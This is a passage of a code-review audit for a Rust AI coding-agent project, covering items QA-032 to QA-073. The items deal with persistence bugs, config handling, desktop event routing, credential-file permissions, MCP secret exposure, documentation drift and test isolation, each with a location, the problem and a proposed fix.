### QA-032 · low · `RUN_APPROVED_HOSTS` grows forever
**Location:** `crates/core/src/orchestrator/network_access.rs:163-169`

**Problem:** a process-global map keyed by run id is never cleared when a run ends.

**Fix:** keep it on `RunHandle`, or remove the entry in `drive_run`'s epilogue.

### QA-033 · low · two parallel sub-agent systems
**Location:** `crates/core/src/orchestrator/mod.rs:1451-1536` (`spawn_agents` v1); `crates/core/src/orchestrator/agents.rs` (`spawn_agent` v2)

**Problem:** both are offered to the model in Build mode. `spawn_agents` does not count against `MAX_CONCURRENT_AGENTS` (4), so the model can exceed the documented cap. There are two prompt and role paths (`sub_agent_role_static` vs `agent_roles::resolve_role`).

**Fix:** keep one model-facing API, or implement `spawn_agents` on top of the `AgentHub`.

---

## 3. Persistence (`crates/core/src/db.rs`)

### QA-034 · high · deleting an active run resurrects a headless rollout
**Location:** `crates/core/src/db.rs:706-718, 923-937`; `apps/desktop-rs/src/components/sidebar.rs:638-645`; `crates/core/src/cli/runner.rs:131-139, 191`

**Problem:** `delete_run` removes the run and its file but does not stop the drive loop. The desktop calls `state.db.delete_run` directly: there is no facade function, which violates the "desktop → api facade" rule. The next `append_message` or `append_usage` hits `rollouts.entry(..).or_insert_with(new_rollout_path)`, which creates a **new rollout without `session_meta`** and re-adds in-memory messages.

The same happens with `lcgn --no-session` on Ctrl+C: `cancel_run` is cooperative and is followed immediately by `delete_run`.

**Scenario:** delete a generating chat from the sidebar. An orphan `rollout-*.jsonl` reappears that no UI lists, and memory is leaked until restart.

**Fix:**
- Add `api::runs::delete_run` that cancels the run, waits for the drive to finish, then deletes.
- In `append_event`, refuse ids that are not in `state.runs` (tombstone set).

### QA-035 · medium · streaming writes a full message copy every 250 ms, bloating rollouts
**Location:** `crates/core/src/orchestrator/mod.rs:54, 714-719`; `crates/core/src/db.rs:767-799`

**Problem:** every `STREAM_PERSIST_INTERVAL` appends a complete `message_update` (content plus reasoning). A 100 KB answer streamed over 100 s writes about 400 lines of up to 100 KB each, tens of MB per message. Startup and `refresh_runs` replay every line of every rollout.

**Fix:**
- Persist the final update only, or a delta, plus a periodic checkpoint (for example every 5 s, and only if changed).
- Optionally rewrite the rollout at run end.

### QA-036 · medium · each usage append reloads all shared files under both locks
**Location:** `crates/core/src/db.rs:270-275, 821-830`

**Problem:** `append_usage` goes through `with_shared_mutation`, which:
- takes the cross-process `.lock`,
- takes the global write lock,
- re-reads `projects.json`, `permissions.json` and every memory `.md` file.

This happens on every LLM call (and every sub-agent call), as blocking I/O on a tokio worker.

**Fix:** lock only around `.usage_seq` allocation, and append without `reload_shared_files`.

### QA-037 · medium · startup fails other processes' live runs
**Location:** `crates/core/src/db.rs:277-334` (`run_startup_tasks`); called from `crates/core/src/api/mod.rs` bootstrap

**Problem:** every run whose status is active is marked `failed`, and a "Session interrupted due to server restart" system message is appended. That includes a run an `lcgn` process is currently driving. The injected system message then becomes part of that run's history.

**Fix:** record an owner (pid plus heartbeat timestamp) in the run, or take a per-run lock file, and only fail runs whose owner is gone.

### QA-038 · medium · storage panics take the whole app down
**Location:** `crates/core/src/db.rs:57-68` (`lock_root` panics if `.lock` cannot be opened); `db.rs:859-865` (`expect("storage lock poisoned")`)

**Problem:**
- A read-only or locked home makes the first mutation panic.
- A panic inside any `patch_run` closure poisons the storage `RwLock`, after which **every** later `Db` call panics. The desktop is then dead until restart.
- `lock_exclusive` blocks a tokio worker.

**Fix:**
- Return `Result` from `lock_root` and degrade to no-lock with a warning.
- Use `unwrap_or_else(PoisonError::into_inner)`.

### QA-039 · medium · cross-process changes are invisible (needs-confirmation)
**Location:** `crates/core/src/db.rs:467-471, 834-843`; `apps/desktop-rs/src/state_ui.rs` (`refresh_runs` → `api::runs::list_runs`)

**Problem:**
- `list_permissions`, `list_memories` and `list_projects` serve the in-memory copy.
- `Db::refresh_runs` is only called by `cli/auth.rs:368` (TUI `/sessions`).
- A grant revoked in the desktop is still honoured by a running `lcgn`.
- Runs created by `lcgn` do not appear in an open desktop until restart, although database-schema.md promises cross-process visibility.
- `refresh_runs` itself re-reads everything under the write lock, which can revert in-flight message content.

**Fix:**
- Re-read `permissions.json` by mtime in `list_permissions`.
- Add an incremental, mtime-based `refresh_runs` that skips runs this process is driving, and call it from the desktop sidebar refresh.

### QA-040 · low · `--no-session` still records the prompt
**Location:** `crates/core/src/db.rs:1088-1096` (`append_history`); `crates/core/src/cli/runner.rs:191`

**Problem:** the prompt goes to `history.jsonl` and `session_index.jsonl` before the run is deleted. Both files are never rewritten, so "no session" still persists the text.

**Fix:** skip the index and history writes for runs created with `no_session`.

### QA-041 · low · runtime state is written into the user's project, and committed here
**Location:** `crates/core/src/api/projects.rs:80-86`; `.locagens/snapshots.json` (tracked since `1b1ac8f`, modified now); `mod.rs:1669-1676`

**Problem:** these files are created in the project, and nothing adds them to `.gitignore`:
- git-snapshot metadata (`.locagens/snapshots.json` plus index copies),
- "allow for project" rules (`.locagens/rules/default.rules`).

This repo itself has its snapshot file committed and dirty.

**Fix:**
- Store snapshots under `~/.locagens/projects/<sanitized>/`.
- `git rm --cached .locagens/snapshots.json` and ignore it.

---

## 4. Configuration seams (`config.toml`, `config_runtime`)

### QA-042 · medium · config is never reloaded (needs-confirmation)
**Location:** `crates/core/src/config_runtime.rs:12-42`

**Problem:** `CURRENT` is set once (`init_from_disk` in `build_core`, or `install` by `lcgn`). Edits to `config.toml` do not reach a running desktop until restart. That covers `notify`, `shell_environment_policy`, sandbox roots, MCP servers, verbosity and compact limits.

**Fix:** reload on mtime change at run start, or expose `config_runtime::reload()` and call it from settings.

### QA-043 · medium · a bad fallback config breaks or silently resets everything (needs-confirmation)
**Location:** `crates/config/src/config_toml.rs:189-199`; `config_runtime.rs:34-41`

**Problem:** a typed-parse failure in the read-only fallbacks (`~/.codex/config.toml`, `~/.pi/agent/config.toml`) fails the whole load:
- `lcgn` exits 2, even `lcgn config`.
- The desktop logs a warning and runs with **all** defaults, dropping valid `~/.locagens` settings.

**Fix:** parse fallback files leniently, ignoring bad keys with a warning. Fail hard only on the primary file.

### QA-044 · medium · `--provider X` without `--model` picks the config model of another provider
**Location:** `crates/core/src/cli/args.rs:225-235`; `crates/core/src/cli/mod.rs:257-269` (`lcgn review`)

**Problem:** `self.model = config.model` is applied even when the CLI provider differs from `config.model_provider`.

**Scenario:** config has `model="gpt-5"`, `model_provider="openai"`. Running `lcgn --provider anthropic` requests model `gpt-5` from Anthropic.

**Fix:** take the config model only when no provider flag is given, or when it equals `config.model_provider`.

### QA-045 · low · parsed-but-unused keys and `lcgn config` gaps
**Location:** `crates/config/src/config_toml.rs`; `crates/core/src/cli/mod.rs:96-110`; `config_toml.rs:386-419`

**Problem:**
- These keys have no consumer: `show_raw_agent_reasoning`, `file_opener` / `Config::file_opener_uri`, `[tui]`, `history.max_bytes`, `exclude_tmpdir_env_var`, `exclude_slash_tmp`, `Config::enabled_mcp_servers`.
- These MCP keys are ignored: `enabled_tools`, `disabled_tools`, `startup_timeout_sec`, `tool_timeout_sec`, `cwd`. They are documented as not applied, but `disabled_tools` silently keeps dangerous tools exposed.
- `lcgn config` runs after `build_core`, so it opens the store and runs the legacy import just to print config.
- Its masking misses secrets in `args` / `notify` arrays and in URL userinfo or query strings.

**Fix:**
- Apply `enabled_tools` / `disabled_tools` in `discover_tool_defs`.
- Move `Command::Config` before `build_core`.
- Mask array items and URL credentials.
- Delete or wire the dead keys.

---

## 5. CLI / TUI

### QA-046 · medium · lagged events are dropped, so a prompt can be lost forever
**Location:** `crates/core/src/api/runs.rs:249-268`; `apps/desktop-rs/src/state_ui.rs:308`; `crates/core/src/cli/runner.rs`; `crates/core/src/cli/tui/driver.rs`

**Problem:** on broadcast lag the forwarder emits `{"type":"lagged"}`, and the desktop does `Lagged => continue`. No frontend re-syncs. If the lost event was `permission_requested`, `question_requested` or a terminal event, the run waits on a card nobody shows. `replay_pending` runs only at subscribe time.

**Fix:** on `lagged` or `RecvError::Lagged`, call `run_pending` and `get_run` and rebuild the UI state.

### QA-047 · medium · the plain renderer mixes messages and leaks sub-agent output into `-p` stdout
**Location:** `crates/core/src/cli/render.rs:53-67, 196-240`

**Problem:**
- `last_content` and `reasoning_printed` are renderer-global, not keyed by message id. A second assistant message is diffed against the previous one: the common prefix is dropped and no newline is printed between them ("I'll checkAll good").
- Sub-agent messages (`agentRole` set) are streamed to stdout interleaved with the main answer, which corrupts `lcgn -p … | other-tool`.

**Fix:** key the stream state by `message.id`, print a separator per message, and route sub-agent output to stderr (or tag it).

### QA-048 · low · REPL and `-p` `@file` handling diverges from the TUI
**Location:** `crates/core/src/cli/args.rs:292-331`; `crates/core/src/cli/repl.rs:106-117`; `crates/core/src/cli/tui/driver.rs:41-63`

**Problem:** the REPL treats every `@word` as a file. "ping @alice" fails the turn with "Cannot read @file". Text is re-joined with single spaces, losing newlines, and paths outside the project are read with no size cap. The TUI has the correct `build_prompt` (existing files only, inside the project, text verbatim).

**Fix:** move the TUI's `build_prompt` into core and use it everywhere.

### QA-049 · low · slash commands and run-event handling are implemented three times
**Location:** `crates/core/src/cli/repl.rs:181-260`; `crates/core/src/cli/tui/driver.rs:371-530`; `apps/desktop-rs/src/components/composer.rs:667-740`

**Problem:**
- `/auto` and `/chat` exist only in the desktop.
- The desktop `/new`, `/fork` and `/undo` are not blocked while a run is generating (the TUI blocks them, `driver.rs:400`).
- Usage summing, the "provider not authenticated" check and permission/question loops are copy-pasted in four places.

**Fix:** add a core `commands` module (parse plus execute) and a shared run-event pump.

---

## 6. Desktop UI (`apps/desktop-rs`)

### QA-050 · high · event streams are never detached, so another run's events show in the current view
**Location:** `apps/desktop-rs/src/state_ui.rs:257-316` (`select_run`, `attach_event_stream`), `319-470` (`process_event`); `components/composer.rs:672-683` (`/new`, `/clear`)

**Problem:** `process_event` compares the message's `run_id` only with the stream's own run id. It never checks `store.active_run_id`. It writes into the shared:
- `messages`, `plan`, `turn_diff`
- `pending_permission`, `pending_question`
- `spawned_agents`, `patch_progress`, `active_run`

**Scenario:** run A is generating and the user opens run B (or `/new`):
- A's streaming messages appear in B.
- A's permission card shows on B, and answering it is sent to B (`permission_decision` uses the active id), which fails.
- A's completion flips B's status.

**Fix:** store an abort handle per stream and cancel it in `select_run` and `/new`. Or guard every store write with `active_run_id == run_id`, and keep background runs' pending prompts as sidebar badges.

### QA-051 · medium · desktop MCP settings ignore project-scoped servers
**Location:** `apps/desktop-rs/src/components/settings.rs:740, 883`

**Problem:** `list_mcp_servers`, `login_mcp_server` and `logout_mcp_server` are called with `project_path = None`. Servers from `<project>/.locagens/mcp.json` are never listed or loginable in the desktop, although runs use them (and `lcgn mcp` passes the project).

**Fix:** pass `store.selected_project`.

### QA-052 · low · user-visible strings that bypass i18n
**Location:**

| File | Line(s) | String |
| --- | --- | --- |
| `components/review.rs` | 129 | `"Code review"` |
| `components/review.rs` | 171 | `title: "Review uncommitted changes"` |
| `components/review.rs` | 196 | `"Select a provider and model first (Settings > Providers)."` (duplicates `toast.select_provider`) |
| `components/review.rs` | 232 | `"Review failed: {}"` |
| `components/settings.rs` | 879 | `"Opening the browser to sign in…"` |
| `components/settings.rs` | 888 | `"MCP sign-in failed: {err}"` |
| `components/settings.rs` | 895 | `"Sign out"` / `"Sign in"` |
| `components/settings.rs` | 765-767 | transport labels |
| `components/settings.rs` | 1009, 1046 | `"plugin"` fallback |
| `components/message_thread.rs` | 443 | `"explorer"` / `"worker"` badges |
| `components/message_thread.rs` | 527 | `"(deleted)"` |
| `components/chat_header.rs` | 40 | `"tok"` |
| `components/right_panel.rs` | 573 | raw `file_kind` tooltip |
| `components/right_panel.rs` | 575-577 | `A` / `D` / `M` badges |
| `components/right_panel.rs` | 279 | `"v"` |
| `components/usage_logs.rs` | 166 | `"planner"` fallback |
| `markdown.rs` | 62 | code-copy `title="Copy"` |
| `markdown.rs` | 192 | `"+ (file deleted)"` |

All of these are verified for review.rs and settings.rs, and reported by the sweep for the rest. There are no hard-coded colours outside `theme.rs` and no emoji. EN/TR key parity is enforced by tests.

**Fix:** add the keys to `i18n.rs` (EN and TR).

### QA-053 · low · accessibility basics
**Location:** `components/message_thread.rs:393, 434`; `components/right_panel.rs:580, 686, 975`; `components/sidebar.rs:294, 455`; backdrops at `composer.rs:216`, `sidebar.rs:113, 518`

**Problem:**
- Clickable `div`s have no `role="button"`, `tabindex` or Enter/Space handler, so tool cards, file rows, project rows and run items cannot be reached by keyboard.
- Modal backdrops close only on click (no Esc).
- Icon-only buttons have `title` but no `aria-label` anywhere.

**Fix:** use `button` elements (or role plus tabindex plus `onkeydown`), add Esc handlers and `aria-label`.

### QA-054 · low · dead and missing event wiring
**Location:** `apps/desktop-rs/src/state_ui.rs:368-376`; `crates/core/src/api/review.rs:77-79`

**Problem:**
- The desktop handles `permission_resolved` and `question_answered`, which core never emits.
- `start_review` patches the run title after `create_run` without emitting `run_title_changed`, so the sidebar shows the raw review task until the next refresh.

**Fix:** remove the dead handlers or emit the events from `apply_permission_decision` / `answer_question_core`. Emit `run_title_changed` from `start_review`, or pass the title into `CreateRunPayload`.

---

## 7. OAuth and credentials

Verified OK:
- PKCE: OsRng, S256.
- Callback server: 127.0.0.1 only, `state` checked first, 16 KB / 5 s limits, HTML-escaped errors.
- Redacting `Debug` impls on `OAuthTokens` and the MCP `OAuthEntry`.
- MCP token file written 0600.

### QA-055 · high · `auth.json` is written world-readable on Unix and without fsync
**Location:** `crates/config/src/providers.rs:573-582` (`write_json`)

**Problem:** `std::fs::write(tmp)` plus `rename` creates the file with the umask (typically 0644). Nothing in `crates/config` sets 0600. Effects:
- API keys and OAuth refresh tokens are readable by other local users.
- A token refresh rewrites the pi or codex fallback `auth.json` as a new inode, downgrading a 0600 file those tools created.
- There is no `sync_all` before `rename`, so a crash can leave an empty `auth.json`.

**Fix:** one `write_private_atomic` helper (create the temp file 0600, `sync_all`, rename), reused by `TokenStore::save` (`mcp/oauth.rs:83-101`) and MCP `save_config`.

### QA-056 · medium · MCP secrets are returned to the UI in full
**Location:** `crates/core/src/services/mcp/mod.rs:38-90`; `crates/core/src/api/mcp.rs` (list, upsert, restart, toggle)

**Problem:** `McpServerConfig` / `McpServerInfo` serialize `env` (stdio API keys), `http_headers` (static `Authorization: Bearer …`) and `env_http_headers` verbatim. Both derive `Debug`. This contradicts the "settings never return raw keys" rule in Claude.md.

**Fix:** return a view model (header names only, masked env values, a preserve marker like provider keys), and give the config a manual `Debug`.

### QA-057 · medium · the `auth.json` lock can be broken while it is held
**Location:** `crates/config/src/oauth/auth_lock.rs:11, 50-80`; `crates/config/src/providers.rs:946-971`

**Problem:**
- `STALE_AFTER = 10 s` has no heartbeat, but the lock is held across refresh HTTP calls with 30 s timeouts and Kimi retries.
- A second process (desktop plus lcgn) breaks the "stale" lock and refreshes with the same rotating refresh token. The loser gets `invalid_grant` and the credential is dead until re-login.
- `Drop` removes the lock dir unconditionally, so it can delete a lock another process now owns.

**Fix:**
- Touch the lock dir every few seconds while held.
- Write an owner token and remove the lock only if it matches.
- Re-read `auth.json` inside the lock before writing.

### QA-058 · medium · `!command` credentials have no timeout and wrong Windows quoting
**Location:** `crates/config/src/providers.rs:1068-1090`

**Problem:**
- No timeout and no `kill_on_drop`: a credential helper waiting on a pinentry or TTY hangs key resolution, and so the run, forever.
- On Windows `c.args(["/C", command])` applies Rust's MSVC escaping (`\"`), which `cmd.exe` does not parse. `!op read "op://vault/item"` breaks. `hooks.rs` already uses `raw_arg` for this.

**Fix:** add a 30 s timeout with `kill_on_drop(true)`, and on Windows use `raw_arg(format!("/S /C \"{command}\""))`.

### QA-059 · medium · MCP OAuth robustness (needs-confirmation)
**Location:** `crates/core/src/services/mcp/oauth.rs:188-236, 297, 387-436`

**Problem:**
- Token refresh is not single-flight; `STORE_LOCK` is not held across the HTTP call and nothing locks across processes. Concurrent tool calls refresh with the same rotating token.
- `load()` returns `Default` on a parse error, so the next `put` wipes every server's tokens.
- Discovered `authorization_endpoint`, `token_endpoint` and `registration_endpoint` are trusted without an https or `issuer` check, and fall back to guessed `{origin}/token`.
- `expires_in` parsed with `as_i64` treats `3600.0` as "never expires".

**Fix:**
- Per-server async single-flight plus `AuthFileLock`.
- Refuse to overwrite an unparsable store.
- Require https (except loopback) and check `issuer`.
- Parse `expires_in` as f64.

### QA-060 · low · the key preview leaks 8 characters
**Location:** `crates/config/src/providers.rs:2008-2013`

**Problem:** for keys longer than 8 bytes, `pi_auth_status` shows the first 4 and last 4 characters, which is 8 of 9 characters for a short secret. The byte slicing can also panic (QA-021).

**Fix:** show only the last 4 characters (counted with `chars()`), and only for keys of 20 characters or more.

### QA-061 · low · smaller credential hygiene issues (needs-confirmation)
**Location:** `crates/config/src/oauth/device_code.rs:81-85`; `crates/config/src/providers.rs:53, 132-170, 1774-1930`; `crates/config/src/oauth/kimi.rs:30-34`

**Problem:**
- Device-code `expires_in` / `interval` from the server are not clamped. A huge value panics in `Duration::from_secs_f64` or in `Instant +`.
- `AuthCredential` and several `*Input` structs that carry `api_key` derive `Debug`.
- `fetch_models` and `test_provider` send the stored key to a caller-supplied `baseUrl`.
- `test_provider` expands a UI-supplied `!cmd`.
- `KIMI_*_OAUTH_HOST` overrides are accepted without an https check.

**Fix:**
- Clamp the durations.
- Use manual `Debug` impls.
- Ignore `baseUrl` when the stored key is used.
- Never expand `!`/`$` in values supplied by the UI.

---

## 8. Code quality (Claude.md principles)

### QA-062 · medium · layering violations and oversized modules
**Location:**

| File | Lines | Issue |
| --- | --- | --- |
| `crates/core/src/api/projects.rs` | 1169 | the facade holds the git snapshot store, undo engine, worktree management and `snapshots.json` I/O, against "facade functions hold no storage logic" |
| `apps/desktop-rs/src/components/sidebar.rs` | 638 | calls `state.db.delete_run` directly |
| `crates/core/src/orchestrator/mod.rs` | 2233 | mixes dispatch, gating, exec sessions, compaction, plan, questions, sub-agents and the drive |
| `crates/config/src/providers.rs` | 3023 | |
| `crates/core/src/db.rs` | 1958 | |
| `crates/core/src/orchestrator/llm.rs` | 1768 | |
| `crates/core/src/cli/tui/app.rs` | 1300 | |
| `apps/desktop-rs/src/components/settings.rs` | 1184 | |

**Fix:**
- Move snapshots and undo into `services/snapshots.rs`.
- Add `api::runs::delete_run`.
- Split `orchestrator/mod.rs` into `gating.rs`, `exec_session.rs`, `drive.rs` and `interactive.rs` (plan, questions).
- Split `providers.rs` into auth store, catalog and model fetch.

### QA-063 · low · unused dependencies
**Location:**

| Crate | Unused dependencies |
| --- | --- |
| `crates/config/Cargo.toml` | `locagens-protocol` |
| `crates/context/Cargo.toml` | `serde` |
| `crates/core/Cargo.toml` | `thiserror`, `tracing-subscriber` |
| `crates/execpolicy/Cargo.toml` | `anyhow` |
| `apps/cli/Cargo.toml` | `tokio`, `anyhow` |
| `apps/desktop-rs/Cargo.toml` | `anyhow` |

There is no `use` of these anywhere under the crate's `src` or `tests`.

**Fix:** remove them. Also install clippy for the GNU toolchain, run `cargo clippy --workspace --all-targets`, and add it to CI (`.github/`).

### QA-064 · low · copy-pasted logic
**Problem:**
- Two `SAFE` env allowlists (`tools.rs:374` and `tools.rs:785`).
- Two private-IP checks (`tools.rs:835`, `network_proxy::is_non_public_ip`).
- Two open-browser implementations (`api/providers.rs:262-290`, `mcp/oauth.rs:439-463`).
- Two `now_ms()` (`config/src/oauth/mod.rs`, `mcp/oauth.rs`).
- Three atomic-write variants (`providers::write_json`, `TokenStore::save`, `mcp::save_config`, the last not atomic).
- Two prompt builders (QA-048).
- Four usage summarizers.

**Fix:** consolidate each into one function in the owning crate.

### QA-065 · low · stale comments and wrong role label
**Location:**
- `crates/protocol/src/lib.rs:9, 121`, `crates/apply-patch/src/lib.rs:554`, `crates/core/src/orchestrator/apply_patch.rs:5` and `crates/execpolicy/src/processes.rs:65` cite `apps/backend/…`.
- `crates/core/src/api/runs.rs` and `orchestrator/mod.rs:1411, 1588` describe `POST /api/runs/:id/...` routes and "SSE", although there is no HTTP server.
- `orchestrator/mod.rs:773` logs the main agent's usage role as `"planner"`, while `docs/database-schema.md` says `main`. The desktop usage view falls back to `"planner"` too (`usage_logs.rs:166`).

**Fix:** update the comments. Log `main` and map legacy `planner` to it on read.

---

## 9. Docs drift

### QA-066 · medium · README.md describes an older product
**Location:** `README.md:29, 94-110, 144-173, 187, 197-260`

**Problem:**
- It says the core is "built on top of pi", reads and writes `~/.pi/agent/auth.json`, and that `lcgn auth login` stores keys there. The primary dir is `~/.locagens`; pi is a read-only fallback.
- The tool list includes `search_web` and `send_input`, which do not exist.
- The tool list omits `apply_patch`, `exec_command`, `write_stdin`, `view_image`, `request_user_input`, `compact_context`, `get_context_remaining`, `host_executable`, `tool_search`, the agent v2 tools, `load_skill` and the MCP resource tools.
- "`run_command`, `fetch_url`, and `search_web` always require permission" is wrong (QA-005, QA-007).
- The "Phase 9" section is a changelog, not a README.
- Nothing covers OAuth logins, the TUI, review mode, hooks, config.toml, sandboxing or MCP over HTTP.

**Fix:** rewrite it from Claude.md plus `docs/*.md`.

### QA-067 · medium · CORE_API.md is out of sync and its Markdown is broken
**Location:** `docs/CORE_API.md` (around lines 13, 23-24, 52, 54, 106-110, 146, 221, 248, 260)

**Problem:**
- The file has 37 code fences, an odd count. The stray fence near line 146 inverts every later block.
- These signatures are wrong:

| Function | Doc | Code |
| --- | --- | --- |
| `apply_permission_decision` | takes `(run_id, call_id, decision, updated_args)` | `(state, handle, decision) -> bool` |
| `answer_question` | takes `AnswerQuestionPayload` | takes `selections` and `notes` |
| `get_provider_configs` | | returns `HashMap<_, EditableProviderConfig>` |
| `save_provider_configs` | | takes a map |
| `fetch_models` | | returns `FetchModelsResult` |
| `delete_plugin`, `delete_skill` | | different parameters |
| `start_review` | takes `ReviewTarget` | takes `StartReviewPayload` |

- `AppState` is missing `settings_path`, and it points at `apps/cli/src/bin/lcgn.rs` and `src/cli/`.
- Undocumented: `fork_run`, `usage_summary`, git stage/unstage/diff, snapshots, undo and worktree functions.

**Fix:** regenerate the signature lists from `crates/core/src/api/*.rs` and fix the fences.

### QA-068 · low · CLI.md inaccuracies
**Location:** `docs/CLI.md:37, 48, 67, 84-121, 156-157`

**Problem:**
- Credentials are said to live in `~/.pi/agent/auth.json`; they are written to `~/.locagens`.
- "Prompted with no echo" is wrong for OAuth providers, which start a browser or device flow.
- `lcgn review` requires a model (exit 2) and emits `review_completed` only on success.
- The gated-tool list omits `exec_command` / `write_stdin`.
- The "chat mode: read/search tools only" list is incomplete.
- REPL `/help` lacks `/review`, and the `/quit` alias is undocumented.

### QA-069 · low · RELEASING.md references a crate that does not exist
**Location:** `docs/RELEASING.md:4, 12, 16`

**Problem:** it says to bump and `git add apps/backend/Cargo.toml`, which no longer exists, so the release steps fail. The crates are `crates/core` (`locagens-core`), `apps/cli` (`locagens-cli`) and `apps/desktop-rs` (`locagens-desktop`), with workspace versioning.

### QA-070 · low · smaller drift and leftovers
**Problem:**
- `state.md` claims "107/107 passing" (now 486), lists phases only up to 10 (none of the OAuth, TUI, review, sandbox, MCP-HTTP or hooks work), and still has the `ProcessManager` note.
- `plan.md` is the original two-model Vue/SQLite MVP plan with no "historical" banner.
- `Claude.md` overstates gating ("`fetch_url` … permission-gated", "dangerous commands always prompt"; QA-005, QA-019).
- `docs/SANDBOX.md:10` claims allowlist-proxy networking for Build on every platform (QA-015).
- `docs/database-schema.md` says `agentRole` is `main` (QA-065).
- The repo root has leftover `locagens.db`, `locagens.db-shm` and `locagens.db-wal` (ignored, but confusing in a "no SQLite" project).

**Fix:** update `state.md`, mark `plan.md` historical or delete it, correct the cited lines, and delete the db files.

---

## 10. Tests

### QA-071 · medium · tests read, and run, the developer's real configuration
**Location:** `apps/cli/tests/lcgn_integration.rs:143-144`; `crates/core/src/services/hooks.rs:115-124` (hook tests in the same file); `crates/config/src/paths.rs:176-178`

**Problem:** the `lcgn` integration test sets `PI_CODING_AGENT_DIR` and `LOCAGENS_DATA_DIR` but not `LOCAGENS_HOME` or `CODEX_HOME`. It therefore picks up the real `~/.locagens` and `~/.codex`:
- `config.toml` (default model, profile, approval policy),
- `auth.json`,
- `hooks.json`.

The hook unit tests call `run_hook_event`, which loads `agent_dir_chain()`, so `cargo test` **executes the developer's own hooks** and depends on their contents.

**Fix:** set all three home variables to temp dirs in the integration test. Give `load_hooks` an injectable root (or honour an env override) and use it in the unit tests.

### QA-072 · medium · important paths have no tests
**Problem:** there are no tests for the bug classes above:
- dispatch of non-offered tools, or explorer writes (QA-004)
- unknown or invalid permission decisions (QA-006)
- `truncate_output`, `read_file`, `compact` with multibyte text at the cut (QA-021)
- `continue_run` while generating; cancel then continue (QA-022, QA-023)
- desktop event routing across runs (QA-050)
- Windows `cmd` metacharacters in `classify_command` (QA-008)
- the ProcessManager log cursor past 2000 entries (QA-026)
- `fetch_url` redirects to private IPs (QA-009)
- `delete_run` during an active run (QA-034)
- the 0600 mode of `auth.json` (QA-055)

state.md also notes the desktop has no end-to-end run test.

**Fix:** add regression tests alongside each fix.

### QA-073 · low · environment-variable mutation in parallel tests without the lock
**Location:** `crates/core/src/services/mcp/remote_tests.rs:264, 418`

**Problem:** `std::env::set_var` is called in multi-threaded tests without the `ENV_VAR_TEST_LOCK` used in `crates/config`. That is a data race on the process environment (and `unsafe` in edition 2024).

**Fix:** pass the values explicitly, or take a shared lock.

---

## Severity index

| Severity | IDs |
| --- | --- |
| critical (2) | 001, 002 |
| high (14) | 003, 004, 005, 006, 007, 008, 009, 010, 021, 022, 023, 034, 050, 055 |
| medium (34) | 011-017, 024-030, 035-039, 042-044, 046, 047, 051, 056-059, 062, 066, 067, 071, 072 |
| low (23) | 018-020, 031-033, 040, 041, 045, 048, 049, 052-054, 060, 061, 063-065, 068-070, 073 |
